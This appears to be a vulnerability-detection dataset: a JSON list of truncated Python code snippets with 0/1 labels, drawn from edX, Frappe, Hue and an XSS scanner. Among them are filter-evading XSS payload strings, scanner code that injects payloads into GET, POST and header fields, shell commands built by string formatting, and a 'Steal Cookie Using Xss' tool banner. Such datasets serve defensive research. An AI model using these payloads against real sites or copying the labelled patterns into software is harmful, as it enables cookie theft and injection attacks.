[{"snippet_id": 10001, "code": " BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False", "label": 1}, {"snippet_id": 15097, "code": "}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite", "label": 0}, {"snippet_id": 45735, "code": "'value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id", "label": 0}, {"snippet_id": 6175, "code": "}\".format(filename)) @property def num_threads(self): \"\"\" Number of worker threads to start(integer). EduID IdP spawns multiple threads to make use of all CPU cores in the password pre-hash function. Number", "label": 0}, {"snippet_id": 46540, "code": "(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable': request.GET.get('is_embeddable', False),", "label": 0}, {"snippet_id": 44434, "code": " @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job", "label": 0}, {"snippet_id": 49333, "code": "'alters_data', False): raise SmartListException(\"Cannot use a function that alters data in smart list\") except AttributeError: self.order_field=self.field_name pass if self.order_field: self.order=SmartOrder", "label": 0}, {"snippet_id": 29775, "code": "\n import cgi import os, sys import funct import sql import ovw form=cgi.FieldStorage() serv=form.getvalue('serv') act=form.getvalue('act') \t print('Content-type: text/html\\n') if act==\"checkrestart\": \tservers", "label": 0}, {"snippet_id": 20503, "code": " course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course.", "label": 0}, {"snippet_id": 9619, "code": "/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P", "label": 0}, {"snippet_id": 24193, "code": ".start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file", "label": 0}, {"snippet_id": 18662, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$", "label": 0}, {"snippet_id": 3490, "code": " xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query", "label": 0}, {"snippet_id": 15539, "code": "-processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ]", "label": 0}, {"snippet_id": 8425, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings", "label": 0}, {"snippet_id": 2529, "code": "(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result", "label": 1}, {"snippet_id": 19495, "code": " validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs", "label": 0}, {"snippet_id": 27484, "code": " add_jinja2_filter('split_br', split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name", "label": 0}, {"snippet_id": 43865, "code": " \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor", "label": 0}, {"snippet_id": 13998, "code": ">[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 19349, "code": ".assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite(''", "label": 1}, {"snippet_id": 28026, "code": " handler.JSON) def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token", "label": 0}, {"snippet_id": 42989, "code": ".is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t", "label": 0}, {"snippet_id": 45159, "code": " credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2,", "label": 0}, {"snippet_id": 50414, "code": " when the client is telling us that it is ready to receive data as soon as it is available. This is the basis of a long-polling(comet) mechanism: the server will wait to reply until data is available. Args", "label": 0}, {"snippet_id": 28226, "code": " None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith", "label": 0}, {"snippet_id": 20285, "code": ": print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty", "label": 0}, {"snippet_id": 35133, "code": " \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError", "label": 0}, {"snippet_id": 663, "code": " Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method", "label": 1}, {"snippet_id": 34996, "code": ".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self", "label": 0}, {"snippet_id": 30469, "code": ", date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql", "label": 0}, {"snippet_id": 39163, "code": "\"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype", "label": 0}, {"snippet_id": 16320, "code": "\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile", "label": 0}, {"snippet_id": 15158, "code": " bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES", "label": 0}, {"snippet_id": 36977, "code": "=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route", "label": 0}, {"snippet_id": 23567, "code": "/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status", "label": 0}, {"snippet_id": 17622, "code": ", url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change", "label": 0}, {"snippet_id": 28527, "code": "'date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a\") \telse: \t\tmess=get_data('date_in_log') +\" from \" +IP +\" user: \" +login +\" \" +action +\" for: \" +serv +\"\\n\" \t", "label": 0}, {"snippet_id": 1371, "code": ", 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ ", "label": 0}, {"snippet_id": 22414, "code": "'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$", "label": 0}, {"snippet_id": 20567, "code": "-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=", "label": 0}, {"snippet_id": 53480, "code": " dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status", "label": 0}, {"snippet_id": 6135, "code": " __init__(self, filename, debug): self._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str(debug) cfgdir=os.path.dirname(filename", "label": 0}, {"snippet_id": 19223, "code": " suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests", "label": 0}, {"snippet_id": 13871, "code": "', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses", "label": 0}, {"snippet_id": 48336, "code": ".POST[\"quantity\"]) notes: str=request.POST[\"notes\"] ar=ArticleRequested() ar.AID=Article.objects.get(id=aid) ar.RID=current_reservation if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int", "label": 1}, {"snippet_id": 20194, "code": "\"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self", "label": 0}, {"snippet_id": 41271, "code": "\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children():", "label": 0}, {"snippet_id": 6696, "code": "(self): \"\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string) for use in simple", "label": 0}, {"snippet_id": 50796, "code": " flags.get('XTERM256', True)) useansi=options.get(\"ansi\", flags.get('ANSI', True)) nocolor=options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not(xterm256 or useansi)) screenreader=options.get(\"screenreader\",", "label": 0}, {"snippet_id": 42246, "code": ".get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm", "label": 0}, {"snippet_id": 20232, "code": "\"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers", "label": 0}, {"snippet_id": 9623, "code": "'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/", "label": 0}, {"snippet_id": 12149, "code": "*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 3201, "code": "(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":", "label": 0}, {"snippet_id": 1953, "code": " else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body", "label": 0}, {"snippet_id": 24776, "code": " \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback", "label": 0}, {"snippet_id": 4053, "code": " impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers", "label": 0}, {"snippet_id": 33100, "code": " from components import decorators from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access", "label": 0}, {"snippet_id": 924, "code": ".urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1:", "label": 1}, {"snippet_id": 23397, "code": ".get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 18391, "code": "/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section", "label": 0}, {"snippet_id": 13618, "code": "-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 39710, "code": "(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif", "label": 0}, {"snippet_id": 18839, "code": ".MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns", "label": 0}, {"snippet_id": 22983, "code": "]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress", "label": 0}, {"snippet_id": 15509, "code": " with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure", "label": 0}, {"snippet_id": 14412, "code": "<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 44893, "code": ".find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': ", "label": 0}, {"snippet_id": 34888, "code": "\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self", "label": 0}, {"snippet_id": 39141, "code": " key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in", "label": 0}, {"snippet_id": 11023, "code": " if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running", "label": 0}, {"snippet_id": 7402, "code": "(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include", "label": 0}, {"snippet_id": 34484, "code": "\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t", "label": 0}, {"snippet_id": 8001, "code": "]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt", "label": 0}, {"snippet_id": 14338, "code": "/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'", "label": 0}, {"snippet_id": 5655, "code": "\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>'", "label": 0}, {"snippet_id": 21559, "code": "<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 46357, "code": "'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response={'status': -1} collection=json", "label": 0}, {"snippet_id": 23976, "code": ".shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self", "label": 0}, {"snippet_id": 24904, "code": ", \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd", "label": 0}, {"snippet_id": 29875, "code": " class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and serv is not None: \tid=form.getvalue('getcert') \tcert_path=sql.get_setting(", "label": 0}, {"snippet_id": 26344, "code": ".vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT on your", "label": 0}, {"snippet_id": 27404, "code": ") elif isinstance(obj, cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t", "label": 0}, {"snippet_id": 45193, "code": "'workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json", "label": 1}, {"snippet_id": 10341, "code": " --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else ", "label": 0}, {"snippet_id": 41560, "code": " strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count", "label": 0}, {"snippet_id": 2246, "code": " vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss", "label": 0}, {"snippet_id": 24681, "code": "--fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo", "label": 0}, {"snippet_id": 1963, "code": "\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads", "label": 0}, {"snippet_id": 13864, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^", "label": 0}, {"snippet_id": 40229, "code": "(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname", "label": 0}, {"snippet_id": 3661, "code": ".logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger", "label": 0}, {"snippet_id": 29292, "code": " install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf\"] \t\telse: \t\t\tcommands=[ \"sudo mv ", "label": 0}, {"snippet_id": 19127, "code": " Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( ", "label": 1}, {"snippet_id": 31824, "code": "+form.getvalue('bwlists_save') \ttry: \t\twith open(list, \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n", "label": 0}, {"snippet_id": 2241, "code": ",headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='", "label": 0}, {"snippet_id": 46282, "code": ":[{'q': ''}], 'fqs':[], 'start': 0} template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad", "label": 0}, {"snippet_id": 39466, "code": "): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) ", "label": 0}, {"snippet_id": 34751, "code": "(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self", "label": 0}, {"snippet_id": 35614, "code": "): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"", "label": 0}, {"snippet_id": 32371, "code": ".join(args.directory, 'README.md')): print(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s", "label": 0}, {"snippet_id": 43851, "code": " display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t", "label": 0}, {"snippet_id": 53060, "code": " coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2',", "label": 0}, {"snippet_id": 52726, "code": ", e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document", "label": 0}, {"snippet_id": 13427, "code": "==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view", "label": 0}, {"snippet_id": 48216, "code": "\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user, str(f.name), category, \" except Exception as e: return redirect(\"/admin/media/add", "label": 0}, {"snippet_id": 41009, "code": ".blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from", "label": 0}, {"snippet_id": 13763, "code": "'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>", "label": 1}, {"snippet_id": 46917, "code": " redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content), redis.enqueue_job('mention_users', self.id, content, user_id), return_exceptions=True ) return", "label": 0}, {"snippet_id": 41531, "code": "\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https", "label": 0}, {"snippet_id": 23697, "code": " given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" ", "label": 0}, {"snippet_id": 30725, "code": ".getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show", "label": 0}, {"snippet_id": 47567, "code": ") f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', text=str(profile.notes)))", "label": 0}, {"snippet_id": 24623, "code": " with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure", "label": 0}, {"snippet_id": 48433, "code": ".notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id) +\"&srid=\" +request.GET[\"srid\"]) else", "label": 1}, {"snippet_id": 24658, "code": "\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts", "label": 0}, {"snippet_id": 50297, "code": " and csession.get(\"webclient_authenticated_uid\", False) if uid: sess.uid=uid sess.logged_in=True sess.sessionhandler.connect(sess) self.last_alive[csessid]=(time.time(), False) if not self.keep_alive: self", "label": 0}, {"snippet_id": 8770, "code": "', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"", "label": 0}, {"snippet_id": 53894, "code": "\\n\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] 